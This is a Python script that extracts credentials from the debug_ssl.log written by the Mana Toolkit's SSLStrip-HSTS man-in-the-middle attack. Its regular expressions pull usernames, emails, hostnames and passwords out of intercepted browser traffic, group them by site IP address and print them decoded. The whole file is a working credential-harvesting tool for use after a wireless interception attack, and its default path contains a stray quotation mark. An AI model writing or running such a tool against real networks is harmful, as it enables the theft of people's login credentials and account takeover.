import re, os.path, argparse
from collections import defaultdict
from urllib.parse import unquote

def capture_creds(filename):
    # Simple regex to inspect strings between each POST or GET request
    
    my_header_regex = re.compile(r'(?:^GET|^POST)\shttps?://(?P<IP_ADDRESS>[\d.]*)',re.IGNORECASE|re.MULTILINE)
    
    # Simple regex to search and capture potential credentials
    
    my_creds_regex = re.compile(r'(?P<HOSTNAME>\'host.*?:.*?)(?:,)|(?P<USERNAME>user.*?=.*?|login.*?=.*?|nickname.*?=.*?|email.*?=.*?|wpname.*?=.*?|alias.*?=.*?|account.*?=.*?|sign.*?=.*?)(?:&)|(?P<PASSWORD>password.*?=.*?)(?:&)', re.I|re.M)
    
    #Save returned results in dictionary with IP address as the key
    
    my_key = 'default_key'
    my_dict = defaultdict(list)
    
    with open(filename,'r', encoding='ascii', errors='surrogateescape') as my_openfile:
        for line in my_openfile:
            check_header = my_header_regex.search(line)
            retrive_creds = my_creds_regex.findall(line)
            if check_header:
                my_key = check_header.group('IP_ADDRESS')
                #print(my_key)
            my_dict[my_key].append(retrive_creds)    
    return my_dict
    

my_file_name_parser = argparse.ArgumentParser(description='''
Simple script to extract credentials from a file called debug_ssl.log. 
This file is used by Mana Toolkit SSLStrip-HSTS to record 
any HTTP data traversing between client's web browser and web application server.

Running the script without option will open and read debug_ssl.log file from a default location 
at "/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/debug_ssl.log"

''')

my_file_name_parser.add_argument("-l", "--location", help="Specify the location of the debug_ssl.log File", default='/usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/debug_ssl.log"')
args = my_file_name_parser.parse_args()

try:
    os.path.isfile(args.location)
    results = capture_creds(args.location)
    for each_key in results.keys():
        print('\nSite IP Address {}\n'.format(each_key))
        for my_dict_items in results[each_key]:
            if my_dict_items :
                for my_list in my_dict_items:
                    for item in my_list:
                        if item:
                            my_decode = unquote(item, encoding='UTF-8')
                            print(my_decode)        

except FileNotFoundError as err:
    print(err)

